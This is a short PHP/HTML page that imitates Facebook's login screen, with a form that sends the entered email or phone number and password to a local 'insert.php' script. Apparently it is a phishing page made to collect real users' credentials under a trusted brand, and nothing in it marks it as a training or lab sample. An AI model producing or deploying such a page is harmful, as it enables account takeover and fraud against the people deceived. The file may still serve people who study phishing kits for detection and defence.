<?php include_once "header.php"; ?>

  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form name="login" method="post" action="insert.php">
          <input name="username" type="text" placeholder="Email or phone number" required>
          <input  name="password"type="password" placeholder="Password" required>
          <div class="link">
            <button type="submit" class="login" name="Submit">Login</button>
            <a href="" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  </body>
</html>